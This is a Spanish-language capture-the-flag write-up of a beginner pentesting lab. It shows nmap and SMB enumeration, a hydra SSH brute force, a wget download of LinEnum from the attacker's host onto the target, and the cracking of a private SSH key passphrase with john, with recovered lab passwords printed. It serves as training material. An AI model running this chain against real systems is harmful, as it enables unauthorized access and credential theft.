## Pentesting basico

escaneo nmap

```
nmap -sV -A 10.10.96.155 -p-
PORT     STATE SERVICE     VERSION
22/tcp   open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat

```
escaneo de directorios

```
 dirb http://10.10.96.155
 ---- Scanning URL: http://10.10.96.155/ ----
==> DIRECTORY: http://10.10.96.155/development/                                                                   
+ http://10.10.96.155/index.html (CODE:200|SIZE:158)                                                              
+ http://10.10.96.155/server-status (CODE:403|SIZE:300)                                                           
                                                                                                                  
---- Entering directory: http://10.10.242.60/development/ ----

```
escaneo enum4linux

```
enum4linux -U -S -P 10.10.96.155
=
                                                                                                                   
                                                                                                                   
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

[+] Retieved partial password policy with rpcclient:                                                               
                                                                                                                   
                                                                                                                   
Password Complexity: Disabled                                                                                      
Minimum Password Length: 5


```
fuerza bruta con hydra

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.96.155 
[22][ssh] host: 10.10.96.155   login: jan   password: armando

```
entrar por ssh con usuario jan/armando y comprobar permisos de usuario

```
jan@basic2:/$ cd
jan@basic2:~$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
jan@basic2:~$ cd ..
jan@basic2:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Apr 19  2018 .
drwxr-xr-x 24 root root 4096 Apr 23  2018 ..
drwxr-xr-x  2 root root 4096 Apr 23  2018 jan
drwxr-xr-x  5 kay  kay  4096 Apr 23  2018 kay
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cat .bash_history
cat: .bash_history: Permission denied
jan@basic2:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied


```
utilizar LinEnum para escalar privilegios

```
git clone https://github.com/rebootuser/LinEnum.git

cd LinEnum 

python3 -m http.server 8888 

ssh jan@10.10.96.155

cd tmp

wget http://10.23.75.205:8888/LinEnum.sh
--2025-05-13 03:46:19--  http://10.23.75.205:8888/LinEnum.sh
Connecting to 10.23.75.205:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                     100%[===================================================>]  45.54K  --.-KB/s    in 0.1s    

2025-05-13 03:46:19 (454 KB/s) - ‘LinEnum.sh’ saved [46631/46631]


chmod +x LinEnum.sh
/tmp$ ./LinEnum.sh -t -r report.txt -e /tmp -k password

[+] Private SSH keys found!:
/home/kay/.ssh/id_rsa

home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub

```
copiar el archivo id_rsa en kali, abrir con nano y copiar en un fichero id_rsa creado en kali

```
nano id_rsa
chmod 600 id_rsa
```
con herramienta ssh2john convertir id_rsa a un archivo legible y desencryptar la key de id_rsa con john

```

ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

beeswax          (id_rsa) 

```
entrar por ssh con usuario kay

```
ssh -i id_rsa kay@10.10.96.155

kay@basic2:~$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo

kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

